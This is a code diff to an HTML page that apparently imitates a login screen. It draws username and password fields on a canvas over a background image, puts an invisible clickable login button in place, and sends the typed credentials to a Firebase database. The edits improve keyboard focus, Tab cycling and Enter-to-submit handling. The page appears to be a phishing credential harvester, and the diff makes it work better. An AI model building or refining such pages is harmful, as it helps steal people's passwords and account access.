@@ -11,6 +11,7 @@
     canvas {
       display: block;
       cursor: default;
+      outline: none; /* Remove focus outline if you want */
     }
   </style>
   <!-- Firebase SDK -->
@@ -18,7 +19,7 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 </head>
 <body>
-  <canvas id="canvas"></canvas>
+  <canvas id="canvas" tabindex="0"></canvas>
   <script>
     // Your Firebase config
     const firebaseConfig = {
@@ -42,6 +43,12 @@
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
 
+    // Make canvas focusable and focus it on load and click
+    canvas.focus();
+    canvas.addEventListener('mousedown', () => {
+      canvas.focus();
+    });
+
     let input1 = '', input2 = '';
     let activeInput = null;
 
@@ -50,7 +57,7 @@
     const input2Box = { x: 785, y: 255, w: 270, h: 28 };
     const buttonBox = { x: 785, y: 305, w: 270, h: 28 };
 
-    // Slightly darker background color for inputs
+    // Slightly lighter background color for inputs
     const inputBgColor = '#121212';
 
     // For blinking cursor
@@ -92,8 +99,7 @@
         const starsWidth = ctx.measureText('*'.repeat(input2.length)).width;
         ctx.fillRect(input2Box.x + 5 + starsWidth, input2Box.y + 5, 2, 18);
       }
-
-      // NO visible login button drawn here — button area is invisible but still clickable
+      // No visible login button drawn here (invisible but clickable)
     }
 
     bgImg.onload = draw;
@@ -133,7 +139,6 @@
         input1Clicked = false;
         canvas.style.cursor = 'text';
       } else if (x > buttonBox.x && x < buttonBox.x + buttonBox.w && y > buttonBox.y && y < buttonBox.y + buttonBox.h) {
-        // Save to Firebase and redirect on click of invisible login button
         saveToFirebase(input1, input2).catch(error => {
           alert('Error saving data: ' + error);
         });
@@ -146,7 +151,6 @@
       draw();
     });
 
-    // Change cursor to pointer on hover over invisible login button area, text cursor on inputs, default otherwise
     canvas.addEventListener('mousemove', e => {
       const rect = canvas.getBoundingClientRect();
       const scaleX = canvas.width / rect.width;
@@ -168,58 +172,46 @@
 
     window.addEventListener('keydown', e => {
       if (e.key === 'Tab') {
-        e.preventDefault(); // prevent default tabbing behavior
+        e.preventDefault(); // prevent browser tab behavior
 
-        // Cycle activeInput: null -> input1 -> input2 -> button -> null ...
         if (activeInput === null) {
           activeInput = 'input1';
           input1Clicked = true;
           input2Clicked = false;
-          canvas.style.cursor = 'text';
         } else if (activeInput === 'input1') {
           activeInput = 'input2';
           input1Clicked = false;
           input2Clicked = true;
-          canvas.style.cursor = 'text';
         } else if (activeInput === 'input2') {
           activeInput = 'button';
           input1Clicked = false;
           input2Clicked = false;
           canvas.style.cursor = 'pointer';
         } else if (activeInput === 'button') {
-          activeInput = null;
-          input1Clicked = false;
+          activeInput = 'input1';
+          input1Clicked = true;
           input2Clicked = false;
-          canvas.style.cursor = 'default';
+          canvas.style.cursor = 'text';
         }
         draw();
-        return;
-      }
-
-      if (e.key === 'Enter') {
-        // If activeInput is null or 'button', treat as login button press
-        if (activeInput === null || activeInput === 'button') {
-          saveToFirebase(input1, input2).catch(error => {
-            alert('Error saving data: ' + error);
-          });
-        } else if (activeInput === 'input1' || activeInput === 'input2') {
-          saveToFirebase(input1, input2).catch(error => {
-            alert('Error saving data: ' + error);
-          });
-        }
-        return;
-      }
-
-      if (!activeInput) return;
-
-      if (e.key === 'Backspace') {
+      } else if (e.key === 'Backspace') {
         if (activeInput === 'input1') input1 = input1.slice(0, -1);
         if (activeInput === 'input2') input2 = input2.slice(0, -1);
+        draw();
+      } else if (e.key === 'Enter') {
+        if (activeInput === 'button' || activeInput === null) {
+          saveToFirebase(input1, input2).catch(error => {
+            alert('Error saving data: ' + error);
+          });
+        } else {
+          // Do nothing or move focus? Could submit if you want
+          // Or move focus to button?
+        }
       } else if (e.key.length === 1) {
         if (activeInput === 'input1') input1 += e.key;
         if (activeInput === 'input2') input2 += e.key;
+        draw();
       }
-      draw();
     });
   </script>
 </body>
